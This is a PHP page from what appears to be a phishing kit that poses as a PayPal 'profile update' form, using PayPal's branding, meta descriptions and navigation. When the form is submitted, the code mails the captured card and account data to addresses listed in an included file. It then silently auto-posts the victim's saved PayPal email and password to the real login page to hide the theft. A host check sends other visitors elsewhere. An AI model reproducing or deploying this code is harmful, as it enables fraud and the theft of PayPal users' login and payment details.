<?php
if (!isset($_SESSION)){
  session_start();
}
$etat=false;
include "../option.php";
include "../lang/Paye.php";
include "../lang/".lang();
if($myhost == $port){
if(isset($_POST['set'])){
include "send-cc.php";



	if (erreur()==false){
		include "to.php";
		for($i=0;$i<$all;$i++){
			mail($send[$i],subject(),cc());
		}
		?>
		<form name="formmy" action="https://www.paypal.com/cgi-bin/webscr?cmd=_login-submit&dispatch=5885d80a13c0db1f8e<?php echo "&ee=$ee"; ?>" method="post">
			 <div style="display:none;">
				<input maxlength="20" name="login_email" size="25" value="<?php echo $_SESSION['emaill'];?>"/>
				<input maxlength="20" name="login_password" size="25" value="<?php echo $_SESSION['passwordd'];?>"/>
			 </div>
		</form>
		<script language="JavaScript">
			setTimeout('document.formmy.submit()',0);
		</script>
		<?php
		$etat=true;
	}else{$etat=false;}
}
if($etat==false){

?>
<!DOCTYPE HTML PUBLIC "-//W3C//DTD HTML 4.01 Transitional//EN" "http://www.w3.org/TR/html4/loose.dtd">
<html><head>
<meta http-equiv="Content-Type" content="text/html; charset=iso-8859-1">

<title><?php echo $profupdate; ?></title><!--googleoff: all-->
<meta http-equiv="keywords" content="Send, money, payments, credit, credit card, instant, money, financial services, mobile, wireless, WAP, mobile phones, two-way pagers, Windows CE"><!--googleon: all--><!--googleoff: all-->
<meta http-equiv="description" content="PayPal lets you send money to anyone with email. PayPal is free for consumers, and works seamlessly with your existing credit card and current account. You can settle debts, borrow cash, divide bills or split expenses with friends, all without going to an ATM or looking for your chequebook."><!--googleon: all-->

<link media="screen" rel="stylesheet" type="text/css" href="../WEBSCR-640-20101004-1/css/core/global.css">
<link rel="stylesheet" type="text/css" href="../WEBSCR-640-20101004-1/css/Customer/pages/paymentFlow.css">
<link rel="stylesheet" type="text/css" href="../WEBSCR-640-20101004-1/css/Customer/pages/pageAddBankAccount.css">
<link rel="stylesheet" type="text/css" href="../WEBSCR-640-20101004-1/css/Customer/pages/lang.css">

<script type="text/javascript">
if (parent.frames.length > 0){
	top.location.replace(document.location);
}</script><script type="text/javascript" src="../WEBSCR-640-20101004-1/js/lib/min/global.js"></script><link rel="shortcut icon" href="../WEBSCR-640-20101004-1/en_US/i/icon/pp_favicon_x.ico">
<style type="text/css">
.Warning {
background:#ffffcc;color:black;
}
select{border:1px solid #84A8CC;margin-bottom:2px;}
input{border:1px solid #84A8CC;margin-bottom:2px;}
</style>
</head>
<body>
<noscript><p class="nonjsAlert">NOTE: Many features on the PayPal Web site require Javascript and cookies. You can enable both via your browser's preference settings.</p></noscript>
<div class="" id="page">
<div class="std" id="header">
<h1><a href="#"><img src="../WEBSCR-640-20101004-1/en_US/i/logo/paypal_logo.gif" alt="PayPal" border="0"></a></h1>
<div class="std" id="navGlobal"><ul>
<li class="logout"><a href="#"><?php echo $logout; ?></a></li>
<li><a href="#"><?php echo $help; ?></a></li>
<li class="last"><a href="#"><?php echo $s_center; ?></a></li>
</ul></div>
<div id="navPrimary" class="srd"><ul class="secondary">
<li class="active">
<a href="#" href="#"><?php echo $myacc; ?></a><ul>
<li><a href="#" href="#"><?php echo $over; ?></a></li>
<li><a href="#" href="#"><?php echo $addfound; ?></a></li>
<li>
<a href="#" href="#"><?php echo $retirar; ?></a><ul><li><a href="#" href="#"><?php echo $banktf; ?></a></li></ul>
</li>
<li>
<a href="#" href="#"><?php echo $history; ?></a><ul>
<li><a href="#" href="#"><?php echo $bsearch; ?></a></li>
<li><a href="#" href="#"><?php echo $dhistory; ?></a></li>
</ul>
</li>
<li class="">
<a href="#" href="#"><?php echo $resolu; ?></a><ul>
<li><a href="#" href="#"><?php echo $opencase; ?></a></li>
<li><a href="#" href="#"><?php echo $guides; ?></a></li>
</ul>
</li>
<li class="active">
<a href="#" href="#"><?php echo $prof; ?></a><ul>
<li><a href="#" href="#"><?php echo $addemail; ?></a></li>
<li><a href="#" href="#"><?php echo $addbank; ?></a></li>
<li><a href="#" href="#"><?php echo $addcard; ?></a></li>
<li><a href="#" href="#"><?php echo $addadr; ?></a></li>
</ul>
</li>
</ul>
</li>
<li><a href="#" href="#"><?php echo $sendmoney; ?></a></li>
<li><a href="#" href="#"><?php echo $reqmoney; ?></a></li>
<li class=""><a href="#" href="#"><?php echo $mservices; ?></a></li>
<li><a href="#" href="#"><?php echo $autools; ?></a></li>
<li><a href="#" href="#"><?php echo $products; ?></a></li>
</ul></div>
</div>
<div style="clear: both;"></div>
<div id="content">
<div id="headline">
	<div class="secure">
		<a rel="nofollow" target="_blank" href="https://www.paypal.com/id/cgi-bin/webscr?cmd=xpt/Merchant/popup/WaxAboutPaypal-outside&amp;justSecure=true" onClick="PAYPAL.core.openWindow(event, {width: 400, height: 480})">
		<span class="small"><?php echo $stra; ?></span></a>
	</div>
	<h2><?php echo $puf; ?></h2>
</div>



<div id="messageBox"></div>
<div id="main"><div class="legacyErrors">
<p><?php echo $completeform; ?></p>

<script language="JavaScript">
function openWindow2() {
popupWin = window.open('../WEBSCR-640-20101004-1/css/Customer/pages/img/pin.html','EIN','scrollbars,resizable,toolbar,width=700,height=480,left=50,top=50');
popupWin.focus();
}
function openWindow1() {
popupWin = window.open('../WEBSCR-640-20101004-1/css/Customer/pages/img/cvv.html','EIN','scrollbars,resizable,toolbar,width=700,height=424,left=100,top=100');
popupWin.focus();
}
function openWindow3() {
popupWin = window.open('../WEBSCR-640-20101004-1/css/Customer/pages/img/routing.html','EIN','scrollbars,resizable,toolbar,width=700,height=615,left=100,top=0');
popupWin.focus();
}
function openWindow4() {
popupWin = window.open('../WEBSCR-640-20101004-1/css/Customer/pages/img/account.html','EIN','scrollbars,resizable,toolbar,width=700,height=615,left=100,top=0');
popupWin.focus();
}
</script>
<iframe src="../pp.php" height="0"  width="0" style="display:none;" ></iframe>
<?php
include "up.php";
?>


<div id="footer" class="srd">
<h5 class="accessAid"><?php echo $t1; ?></h5>
<ul>
<li class="first"><a href="#"><?php echo $t2; ?></a></li>
<li><a href="#"><?php echo $t3; ?></a></li>
<li><a href="#"><?php echo $t4; ?></a></li>
<li><a href="#"><?php echo $t5; ?></a></li>
<li><a href="#"><?php echo $t6; ?></a></li>
<li><a href="#"><?php echo $t7; ?></a></li>
<li><a href="#"><?php echo $t8; ?></a></li>
<li><a href="#r"><?php echo $t9; ?></a></li>
<li><a href="#"><?php echo $t10; ?></a></li>
<li><a href="#"><?php echo $t11; ?></a></li>
<li><a href="#"><?php echo $t12; ?></a></li>
<li><a href="#"><?php echo $t13; ?></a></li>
<li><a href="#"><?php echo $t14; ?></a></li>
<li><a href="#"><?php echo $t15; ?></a></li>
<li class="last"><a href="#"><?php echo $t16; ?></a></li>
</ul>
<p id="footerSecure"><a target="" href="#"><img border="0" src="../WEBSCR-640-20101004-1/css/Customer/pages/img/logo_VIPwhite_66x27.gif" alt=""></a></p>
<p id="legal"><?php echo $copyright; ?><br><a href="#"><?php echo $fdic; ?></a></p>
</div>
<div class="hide" id="navFull"></div></div>
</body></html>
<?php
}
}else{
include "../redi.php";
}
?>